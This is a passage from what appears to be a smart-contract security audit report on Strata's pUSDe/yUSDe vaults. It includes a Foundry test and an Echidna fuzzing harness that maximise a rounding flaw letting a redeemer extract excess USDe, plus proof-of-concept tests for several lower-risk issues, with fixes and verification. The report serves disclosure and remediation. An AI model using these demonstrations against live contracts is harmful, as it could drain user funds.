            vm.startPrank(account);
            USDe.mint(account, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        uint256 sUSDeYieldAmount = 1_000 ether;
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe_actual = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        // bob redeems from yUSDe
        uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
        vm.prank(bob);
        uint256 bobRedeemed_pUSDe_reported = yUSDe.redeem(bobShares_yUSDe, bob, bob);
        uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
        uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

        console2.log("Alice redeemed sUSDe: %s", aliceRedeemed_sUSDe);
        console2.log("Alice redeemed USDe (reported): %s", aliceRedeemed_USDe_reported);
        console2.log("Alice redeemed USDe (actual): %s", aliceRedeemed_USDe_actual);

        console2.log("Bob redeemed pUSDe (reported): %s", bobRedeemed_pUSDe_reported);
        console2.log("Bob redeemed pUSDe (actual): %s", bobShares_pUSDe);
        console2.log("Bob redeemed sUSDe: %s", bobRedeemed_sUSDe);
        console2.log("Bob redeemed USDe: %s", bobRedeemed_USDe);

        // post-redemption assertions
        assertEq(
            aliceRedeemed_USDe_reported,
            aliceRedeemed_USDe_actual,
            "Alice's reported and actual USDe redemption amounts should match"
        );

        assertGe(
            bobRedeemed_pUSDe_reported,
            bobShares_pUSDe,
            "Bob should redeem at least the same amount of pUSDe as his original deposit"
        );

        assertGe(
            bobRedeemed_USDe, userDeposit, "Bob should redeem at least the same amount of USDe as his initial deposit"
        );

        assertLe(
            aliceRedeemed_USDe_actual,
            userDeposit,
            "Alice should redeem no more than the same amount of USDe as her initial deposit"
        );
    }
}
```

The following Echidna optimization test can also be run to maximise this discrepancy:

```solidity
// SPDX-License-Identifier: GPL-2.0
pragma solidity ^0.8.0;

import {BaseSetup} from "@chimera/BaseSetup.sol";
import {CryticAsserts} from "@chimera/CryticAsserts.sol";
import {vm} from "@chimera/Hevm.sol";

import {pUSDeVault} from "contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "contracts/predeposit/yUSDeVault.sol";
import {MockUSDe} from "contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "contracts/test/MockStakedUSDe.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// echidna . --contract CryticRoundingTester --config echidna_rounding.yaml --format text --workers 16 --test-limit 1000000
contract CryticRoundingTester is BaseSetup, CryticAsserts {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe USDe;
    MockStakedUSDe sUSDe;
    pUSDeVault pUSDe;
    yUSDeVault yUSDe;

    address owner;
    address alice = address(uint160(uint256(keccak256(abi.encodePacked("alice")))));
    address bob = address(uint160(uint256(keccak256(abi.encodePacked("bob")))));
    uint256 severity;

    constructor() payable {
        setup();
    }

    function setup() internal virtual override {
        owner = msg.sender;

        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function target(uint256 aliceDeposit, uint256 bobDeposit, uint256 sUSDeYieldAmount) public {
        aliceDeposit = between(aliceDeposit, 1, 100_000 ether);
        bobDeposit = between(bobDeposit, 1, 100_000 ether);
        sUSDeYieldAmount = between(sUSDeYieldAmount, 1, 500_000 ether);
        precondition(aliceDeposit <= 100_000 ether);
        precondition(bobDeposit <= 100_000 ether);
        precondition(sUSDeYieldAmount <= 500_000 ether);

        // fund users
        USDe.mint(alice, aliceDeposit);
        USDe.mint(bob, bobDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), aliceDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(aliceDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), bobDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(bobDeposit, bob);
        vm.stopPrank();

        // setup assertions
        eq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        eq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            uint256 initialAdminTransferAmount = 1e6;
            vm.startPrank(owner);
            USDe.mint(owner, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe_actual = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        // bob redeems from yUSDe
        uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
        vm.prank(bob);
        uint256 bobRedeemed_pUSDe_reported = yUSDe.redeem(bobShares_yUSDe, bob, bob);
        uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
        uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

        // optimize
        if (aliceRedeemed_USDe_actual > aliceDeposit) {
            uint256 diff = aliceRedeemed_USDe_actual - aliceDeposit;
            if (diff > severity) {
                severity = diff;
            }
        }
    }

    function echidna_opt_severity() public view returns (uint256) {
        return severity;
    }
}
```

Config:
```yaml
testMode: "optimization"
prefix: "echidna_"
coverage: true
corpusDir: "echidna_rounding"
balanceAddr: 0x1043561a8829300000
balanceContract: 0x1043561a8829300000
filterFunctions: []
cryticArgs: ["--foundry-compile-all"]
deployer: "0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496"
contractAddr: "0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496"
shrinkLimit: 100000
```

Output:
```bash
echidna_opt_severity: max value: 444330
```

**Recommended Mitigation:** Rather than calling `previewWithdraw()` which rounds up, call `convertToShares()` which rounds down:

```solidity
function previewWithdraw(uint256 assets) public view virtual override returns (uint256) {
    return _convertToShares(assets, Math.Rounding.Up);
}

function convertToShares(uint256 assets) public view virtual override returns (uint256) {
    return _convertToShares(assets, Math.Rounding.Down);
}
```

**Strata:** Fixed in commit [59fcf23](https://github.com/Strata-Money/contracts/commit/59fcf239a9089d14f02621a7f692bcda6c85690e).

**Cyfrin:** Verified. The sUSDe to transfer out to the receiver is now calculated using `convertToShares()` which rounds down.

\clearpage
## Low Risk


### Upgradeable contracts which are inherited from should use ERC7201 namespaced storage layouts or storage gaps to prevent storage collision

**Description:** The protocol has upgradeable contracts which other contracts inherit from. These contracts should either use:
* [ERC7201](https://eips.ethereum.org/EIPS/eip-7201) namespaced storage layouts - [example](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L60-L72)
* storage gaps (though this is an [older and no longer preferred](https://blog.openzeppelin.com/introducing-openzeppelin-contracts-5.0#Namespaced) method)

The ideal mitigation is that all upgradeable contracts use ERC7201 namespaced storage layouts.

Without using one of the above two techniques storage collision can occur during upgrades.

**Strata:** Fixed in commit [98068bd](https://github.com/Strata-Money/contracts/commit/98068bd9d9d435b37ce8f855f45b61d37aa274db).

**Cyfrin:** Verified.


### In `pUSDeDepositor::deposit_viaSwap`, using `block.timestamp` in swap deadline is not very effective

**Description:** [Using `block.timestamp` in a swap deadline](https://dacian.me/defi-slippage-attacks#heading-no-expiration-deadline) is not very effective since `block.timestamp` will be the block which the transaction gets put in, so the swap will never be able to expire in this way.

Instead the current `block.timestamp` should be retrieved off-chain and passed as input to the swap transaction.

**Strata:** Fixed in commit [2c43c07](https://github.com/Strata-Money/contracts/commit/2c43c07a839eb9d593c6bf67fc1b5c75b694aed7).

**Cyfrin:** Verified. Callers can now override the default swap deadline.


### Hard-coded slippage in `pUSDeDepositor::deposit_viaSwap` can lead to denial of service

**Description:** [Hard-coded slippage](https://dacian.me/defi-slippage-attacks#heading-hard-coded-slippage-may-freeze-user-funds) in `pUSDeDepositor::deposit_viaSwap` can lead to denial of service and in dramatic cases even [lock user funds](https://x.com/0xULTI/status/1875220541625528539).

**Recommended Mitigation:** Slippage parameters should be calculated off-chain and supplied as input to swaps.

**Strata:** Fixed in commit [2c43c07](https://github.com/Strata-Money/contracts/commit/2c43c07a839eb9d593c6bf67fc1b5c75b694aed7).

**Cyfrin:** Verified. Callers can now override the default slippage.


### Use `SafeERC20::forceApprove` instead of standard `IERC20::approve`

**Description:** Use [`SafeERC20::forceApprove`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L101-L108) when dealing with a range of potential tokens instead of standard `IERC20::approve`:
```solidity
predeposit/yUSDeDepositor.sol
58:        pUSDe.approve(address(yUSDe), amount);

predeposit/pUSDeVault.sol
178:        USDe.approve(address(sUSDe), USDeAssets);

predeposit/pUSDeDepositor.sol
86:            asset.approve(address(vault), amount);
98:        sUSDe.approve(address(pUSDe), amount);
110:        USDe.approve(address(pUSDe), amount);
122:        token.approve(swapInfo.router, amount);
```

**Strata:** Fixed in commit [f258bdc](https://github.com/Strata-Money/contracts/commit/f258bdcc49b87a2f8658b150bc3e3597a5187816).

**Cyfrin:** Verified.


### `MetaVault::redeem` erroneously calls `ERC4626Upgradeable::withdraw` when attempting to redeem `USDe` from `pUSDeVault`

**Description:** Unlike `MetaVault::deposit`, `MetaVault::mint`, and `MetaVault::withdraw` which all invoke the corresponding `IERC4626` function, `MetaVault::redeem` erroneously calls `ERC4626Upgradeable::withdraw` when attempting to redeem `USDe` from `pUSDeVault`:

```solidity
function redeem(address token, uint256 shares, address receiver, address owner) public virtual returns (uint256) {
    if (token == asset()) {
        return withdraw(shares, receiver, owner);
    }
    ...
}
```

**Impact:** The behavior of `MetaVault::redeem` differs from that which is expected depending on whether `token` is specified as `USDe` or one of the other supported vault tokens.

**Recommended Mitigation:**
```diff
    function redeem(address token, uint256 shares, address receiver, address owner) public virtual returns (uint256) {
        if (token == asset()) {
--          return withdraw(shares, receiver, owner);
++          return redeem(shares, receiver, owner);
        }
        ...
    }
```

**Strata:** Fixed in commit [7665e7f](https://github.com/Strata-Money/contracts/commit/7665e7f3cd44d8a025f555737677d2014f4ac8a8).

**Cyfrin:** Verified.


### Duplicate vaults can be pushed to `assetsArr`

**Description:** While `MetaVault::addVault` is protected by the `onlyOwner` modifier, there is no restriction on the number of times this function can be called with a given `vaultAddress` as argument:

```solidity
    function addVault(address vaultAddress) external onlyOwner {
        addVaultInner(vaultAddress);
    }

    function addVaultInner (address vaultAddress) internal {
        TAsset memory vault = TAsset(vaultAddress, EAssetType.ERC4626);
        assetsMap[vaultAddress] = vault;
@>      assetsArr.push(vault);

        emit OnVaultAdded(vaultAddress);
    }
```

In such a scenario, the vault will become duplicated within the `assetsArr` array. When called in `pUSDeVault::startYieldPhase`, the core redemption logic of `MetaVault::redeemMetaVaults` continues to function as expected. During the second iteration for the given vault address, the contract balance will simply be zero, so the redemption will be skipped, the `assetsMap` entry will again be re-written to default values, and the duplicate element will be removed from the array:

```solidity
    function removeVaultAndRedeemInner (address vaultAddress) internal {
        // Redeem
        uint balance = IERC20(vaultAddress).balanceOf(address(this));
@>      if (balance > 0) {
@>          IERC4626(vaultAddress).redeem(balance, address(this), address(this));
        }

        // Clean
        TAsset memory emptyAsset;
@>      assetsMap[vaultAddress] = emptyAsset;
        uint length = assetsArr.length;
        for (uint i = 0; i < length; i++) {
            if (assetsArr[i].asset == vaultAddress) {
                assetsArr[i] = assetsArr[length - 1];
@>              assetsArr.pop();
                break;
            }
        }
    }

    /// @dev Internal method to redeem all assets from supported vaults
    /// @notice Iterates through all supported vaults and redeems their assets for the base token
    function redeemMetaVaults () internal {
        while (assetsArr.length > 0) {
@>          removeVaultAndRedeemInner(assetsArr[0].asset);
        }
    }
```

However, if the given vault is removed from the list of supported vaults, `MetaVault::removeVault` will not allow the duplicate entry to be removed since the `requireSupportedVault()` invocation would fail on any subsequent attempt given that the mapping state is already overwritten to `address(0)` in the `removeVaultAndRedeemInner()` invocation:

```solidity
    function requireSupportedVault(address token) internal view {
@>      address vaultAddress = assetsMap[token].asset;
        if (vaultAddress == address(0)) {
            revert UnsupportedAsset(token);
        }
    }

    function removeVault(address vaultAddress) external onlyOwner {
@>      requireSupportedVault(vaultAddress);
        removeVaultAndRedeemInner(vaultAddress);

        emit OnVaultRemoved(vaultAddress);
    }
```

The consequence of this depends on the intentions of the owner:
* If they intend to keep the vault supported, all `MetaVault` functionality relying on the specified asset being a supported vault will revert if it has been attempted by the owner to remove a duplicated vault.
* If they intend to completely remove the vault, this will not be possible; however, it will also not be possible to make any subsequent deposits, so impact is limited to redeeming during the transition to the yield phase rather than instantaneously.

**Impact:** Vault assets could be redeemed later than intended and users could be temporarily prevented from withdrawing their funds.

**Proof of Concept:** The following test should be included in `pUSDeVault.t.sol`:

```solidity
function test_duplicateVaults() public {
    pUSDe.addVault(address(eUSDe));
    pUSDe.removeVault(address(eUSDe));
    assertFalse(pUSDe.isAssetSupported(address(eUSDe)));
    vm.expectRevert();
    pUSDe.removeVault(address(eUSDe));
}
```

**Recommended Mitigation:** Revert if the given vault has already been added.

**Strata:** Fixed in commit [787d1c7](https://github.com/Strata-Money/contracts/commit/787d1c72e86308897f06af775ed30b8dbef4cf2b).

**Cyfrin:** Verified.


### `MetaVault::addVault` should enforce identical underlying base asset

**Description:** When supporting additional vaults, `MetaVault::addVault` should enforce that the new vault being supported has an identical underlying base asset as itself. Otherwise:
* `redeemRequiredBaseAssets` won't work as expected since the newly supported vault doesn't have the same base asset
* `MetaVault::depositedBase` will become corrupt, especially if the underlying asset tokens use different decimal precision

**Proof of Concept:**
```solidity
function test_vaultSupportedWithDifferentUnderlyingAsset() external {
    // create ERC4626 vault with different underlying ERC20 asset
    MockUSDe differentERC20 = new MockUSDe();
    MockERC4626 newSupportedVault = new MockERC4626(differentERC20);

    // verify pUSDe doesn't have same underlying asset as new vault
    assertNotEq(pUSDe.asset(), newSupportedVault.asset());

    // but still allows it to be added
    pUSDe.addVault(address(newSupportedVault));

    // this breaks `MetaVault::redeemRequiredBaseAssets` since
    // the newly supported vault doesn't have the same base asset
}
```

**Recommended Mitigation:** Change `MetaVault::addVaultInner`:
```diff
    function addVaultInner (address vaultAddress) internal {
+       IERC4626 newVault = IERC4626(vaultAddress);
+       require(newVault.asset() == asset(), "Vault asset mismatch");
```

**Strata:** Fixed in commits [9e64f09](https://github.com/Strata-Money/contracts/commit/9e64f09af6eb927c9c736796aeb92333dbb72c18), [706c2df](https://github.com/Strata-Money/contracts/commit/706c2df3f2caf6651b1d8e858beb5097dbd7d066).

**Cyfrin:** Verified.


### `pUSDeVault::startYieldPhase` should not remove supported vaults from being supported or should prevent new supported vaults once in the yield phase

**Description:** The intention of `pUSDeVault::startYieldPhase` is to convert assets from existing supported vaults into `USDe` in order to then stake the vault's total `USDe` into the `sUSDe` vault.

However because this ends up calling `MetaVault::removeVaultAndRedeemInner`, all the supported vaults are also removed after their assets are converted.

But new vaults can continue to be added during the yield phase, so it makes no sense to remove all supported vaults at this time.

**Impact:** The contract owner will need to re-add all the previously enabled supported vaults causing all user deposits to revert until this is done.

**Proof Of Concept:**
```solidity
function test_supportedVaultsRemovedWhenYieldPhaseEnabled() external {
    // supported vault prior to yield phase
    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));

    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    // admin triggers yield phase on main vault
    pUSDe.startYieldPhase();

    // supported vault was removed when initiating yield phase
    assertFalse(pUSDe.isAssetSupported(address(eUSDe)));

    // but can be added back in?
    pUSDe.addVault(address(eUSDe));
    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));

    // what was the point of removing it if it can be re-added
    // and used again during the yield phase?
}
```

**Recommended Mitigation:** Don't remove all supported vaults when calling `pUSDeVault::startYieldPhase`; just convert their assets to `USDe` but continue to allow the vaults themselves to be supported and accept future deposits.

Alternatively don't allow supported vaults to be added during the yield phase (apart from sUSDe which is added when the yield phase is enabled). In this case removing them when enabled the yield phase is fine, but add code to disallow adding them once the yield phase is enabled.

**Strata:** Fixed in commit [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190) by no longer allowing adding new supporting vaults during the yield phase.

**Cyfrin:** Verified.


### No way to compound deposited supported vault assets into `sUSDe` stake during yield phase

**Description:** Once the yield phase has been enabled, `pUSDeVault` still allows new supported vaults to be added and deposits via supported vaults.

However for supported vaults which are not `sUSDe`, there is no way to withdraw their base token `USDe` and compound into the `sUSDe` vault stake used by the `pUSDeVault` vault.

**Recommended Mitigation:** Either don't allow supported vaults to be added apart from `sUSDe` once yield phase has been enabled, or implement a function to withdraw their base token and compound it into the main stake.

**Strata:** Fixed in commit [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190) by no longer allowing adding new supporting vaults during the yield phase.

**Cyfrin:** Verified.


### `pUSDeVault::maxWithdraw` doesn't account for withdrawal pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`

**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxWithdraw`:
> MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST return 0.

`pUSDeVault::maxWithdraw` doesn't account for withdrawal pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`.

**Proof of Concept:**
```solidity
function test_maxWithdraw_WhenWithdrawalsPaused() external {
    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    // admin pauses withdrawals
    pUSDe.setWithdrawalsEnabled(false);

    // reverts as maxWithdraw returns user1AmountInMainVault even though
    // attempting to withdraw would revert
    assertEq(pUSDe.maxWithdraw(user1), 0);

    // https://eips.ethereum.org/EIPS/eip-4626 maxWithdraw says:
    // MUST factor in both global and user-specific limits,
    // like if withdrawals are entirely disabled (even temporarily) it MUST return 0
}
```

**Recommended Mitigation:** When withdrawals are paused, `maxWithdraw` should return 0. The override of `maxWithdraw` should likely be done in `PreDepositVault` because there is where the pausing is implemented.

**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).

**Cyfrin:** Verified.


### `pUSDeVault::maxDeposit` doesn't account for deposit pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`

**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxDeposit`:
> MUST factor in both global and user-specific limits, like if deposits are entirely disabled (even temporarily) it MUST return 0.

`pUSDeVault::maxDeposit` doesn't account for deposit pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`.

**Proof of Concept:**
```solidity
function test_maxDeposit_WhenDepositsPaused() external {
    // admin pauses deposists
    pUSDe.setDepositsEnabled(false);

    // reverts as maxDeposit returns uint256.max even though
    // attempting to deposit would revert
    assertEq(pUSDe.maxDeposit(user1), 0);

    // https://eips.ethereum.org/EIPS/eip-4626 maxDeposit says:
    // MUST factor in both global and user-specific limits,
    // like if deposits are entirely disabled (even temporarily) it MUST return 0.
}
```

**Recommended Mitigation:** When deposits are paused, `maxDeposit` should return 0. The override of `maxDeposit` should likely be done in `PreDepositVault` because there is where the pausing is implemented.

**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).

**Cyfrin:** Verified.


### `pUSDeVault::maxMint` doesn't account for mint pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`

**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxMint`:
> MUST factor in both global and user-specific limits, like if mints are entirely disabled (even temporarily) it MUST return 0.

`pUSDeVault::maxMint` doesn't account for mint pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`. Since `MetaVault::mint` uses `_deposit`, mints will be paused when deposits are paused.

**Proof of Concept:**
```solidity
function test_maxMint_WhenDepositsPaused() external {
    // admin pauses deposists
    pUSDe.setDepositsEnabled(false);

    // should revert here as maxMint should return 0
    // since deposits are paused and `MetaVault::mint` uses `_deposit`
    assertEq(pUSDe.maxMint(user1), type(uint256).max);

    // attempt to mint to show the error
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    // reverts with DepositsDisabled since `MetaVault::mint` uses `_deposit`
    uint256 user1MainVaultShares = pUSDe.mint(user1AmountInMainVault, user1);
    vm.stopPrank();

    // https://eips.ethereum.org/EIPS/eip-4626 maxMint says:
    // MUST factor in both global and user-specific limits,
    // like if mints are entirely disabled (even temporarily) it MUST return 0.
}
```

**Recommended Mitigation:** When deposits are paused, `maxMint` should return 0. The override of `maxMint` should likely be done in `PreDepositVault` because there is where the pausing is implemented.

**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).

**Cyfrin:** Verified.


### `pUSDeVault::maxRedeem` doesn't account for redemption pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`

**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxRedeem`:
> MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return 0.

`pUSDeVault::maxRedeem` doesn't account for redemption pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`. `MetaVault::redeem` uses `_withdraw` so redemptions will be paused when withdrawals are paused.

**Proof of Concept:**
```solidity
function test_maxRedeem_WhenWithdrawalsPaused() external {
    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    // admin pauses withdrawals
    pUSDe.setWithdrawalsEnabled(false);

    // doesn't revert but it should since `MetaVault::redeem` uses `_withdraw`
    // and withdraws are paused, so `maxRedeem` should return 0
    assertEq(pUSDe.maxRedeem(user1), user1AmountInMainVault);

    // reverts with WithdrawalsDisabled
    vm.prank(user1);
    pUSDe.redeem(user1MainVaultShares, user1, user1);

    // https://eips.ethereum.org/EIPS/eip-4626 maxRedeem says:
    // MUST factor in both global and user-specific limits,
    // like if redemption are entirely disabled (even temporarily) it MUST return 0
}
```

**Recommended Mitigation:** When withdrawals are paused, `maxRedeem` should return 0. The override of `maxRedeem` should likely be done in `PreDepositVault` because there is where the pausing is implemented.

**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).

**Cyfrin:** Verified.


### `yUSDeVault` inherits from `PreDepositVault` but doesn't call `onAfterDepositChecks` or `onAfterWithdrawalChecks`

**Description:** `pUSDeVault` and `yUSDeVault` both inherit from `PreDepositVault`.

`pUSDeVault` uses `PreDepositVault::onAfterDepositChecks` and `onAfterWithdrawalChecks` inside its overriden `_deposit` and `_withdraw` functions.

However `yUSDeVault` doesn't do this; instead it attempts to re-implement the same code as these functions inside its `_deposit` and `_withdraw`, but omits this code from `onAfterWithdrawalChecks`:
```solidity
if (totalSupply() < MIN_SHARES) {
    revert MinSharesViolation();
}
```

**Impact:** The `MIN_SHARES` check won't be enforced in `yUSDeVault`.

**Recommended Mitigation:** Use `PreDepositVault::onAfterDepositChecks` and `onAfterWithdrawalChecks` inside `yUSDeVault::_deposit` and `_withdraw`.

Alternatively if the omission of the `MIN_SHARES` check is intentional, then add a boolean parameter to `onAfterWithdrawalChecks` whether to perform the check or not so that `yUSDeVault` can use the two functions it inherits to reduce code duplication.

**Strata:** Fixed in commits [3f02ce5](https://github.com/Strata-Money/contracts/commit/3f02ce5c1076cbcab8943eae320ecfd590c1f634), [0812d57](https://github.com/Strata-Money/contracts/commit/0812d57f006d4cf3606b7a9c99bbbdf576c4e089).

**Cyfrin:** Verified.


### Inability to remove and redeem from vaults with withdrawal issues could result in a bank-run

**Description:** When deposits are made to the `pUSDeVault`, `depositedBase` is incremented based on the previewed quote amount of USDe underlying the external ERC-4626 vaults; however, these instantaneous preview quotes are not necessarily accurate when compared to the maximum amount that is actually withdrawable. For example, `MetaVault::deposit` implements calculation of the base USDe assets as:

```solidity
uint baseAssets = IERC4626(token).previewRedeem(tokenAssets);
```

But if the vault has overridden the max withdraw/redeem functions with custom logic that apply some limits then this previewed value could be larger than the actual maximum withdrawable USDe amount. This is possible because the ERC-4626 specification states that preview functions must not account for withdrawal/redemption limits like those returned from maxWithdraw/maxRedeem and should always act as though the redemption would be accepted.

Therefore, given that there is not actually a withdrawal that is executed during the deposit, the `depositedBase` state is incremented assuming the underlying USDe if fully redeemable, but it is not until removing and redeeming the vault that a revert could arise if the third-party vault malfunctions or restricts withdrawals. Currently, the only way to pause new deposits for a given vault is by removing the asset from the supported list; however, doing so also triggers a withdrawal of USDe which can fail for the reasons stated above, preventing the asset from being removed.

While none of the externally-supported vault tokens intend to function with a decrease in share price, it is of course not possible except in very simplistic implementations to rule out the possibility of a smart contract hack in which the underlying USDe is stolen from one of the supported vaults. Combined with the issue above, given that users are free to withdraw into a any supported vault token regardless of those that they supplied, full withdraw by other users into unaffected vault tokens (or even if the required USDe is pulled from these vaults by `MetaVault::redeemRequiredBaseAssets` to process their withdrawals), this could result in a subset of users being left with the bad debt rather than it being amortized.

It is understood that the protocol team has strict criteria for supporting new third-party vaults, including the need for instant withdrawals, no limits, no cooldowns, and not pausable, though exceptions may be made for partners that maintain robust communication channels regarding development plans and updates.

**Impact:** The inability to remove and redeem from vaults with withdrawal issues could result in a bank-run that leaves a subset of users with un-redeemable tokens.

**Recommended Mitigation:** Implement some mechanism to disable new deposits to a vault without having to remove it and (attempt to) fully-redeem the underlying tokens. To amortize any losses a potential faulty vault, it may be necessary to track the individual vault contributions to `depositedBase` and so that they can be negated from redemption calculations.

**Strata:** Fixed in commit [ae71893](https://github.com/Strata-Money/contracts/commit/ae718938d56ac581e9479e2831e5b75c67dda738).

**Cyfrin:** Verified.


### `yUSDeVault` edge cases should be explicitly handled to prevent view functions from reverting

**Description:** Per the ERC-4626 specification, the preview functions "MUST NOT revert due to vault specific user/global limits. MAY revert due to other conditions that would also cause mint/deposit/redeem/withdraw to revert".

```solidity
    function totalAccruedUSDe() public view returns (uint256) {
@>      uint pUSDeAssets = super.totalAssets();  // @audit - should return early if pUSDeAssets is zero to avoid reverting in the call below

